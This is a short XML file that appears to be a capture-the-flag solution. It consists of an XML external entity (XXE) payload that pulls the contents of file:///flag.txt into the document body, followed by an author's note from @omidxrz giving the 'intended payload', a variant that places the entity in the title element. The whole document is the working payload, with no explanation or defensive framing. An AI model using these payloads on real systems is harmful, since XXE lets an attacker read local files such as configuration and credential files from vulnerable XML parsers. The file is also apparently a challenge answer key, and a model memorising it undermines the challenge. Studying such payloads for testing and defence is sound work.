<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<doc>

  <title>Hello</title>
  <body>&xxe;</body>
</doc>









Author's Note
@omidxrz
The intended payload is:

<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<doc>
  <title>&xxe;</title>
  <body>demo</body>
</doc>

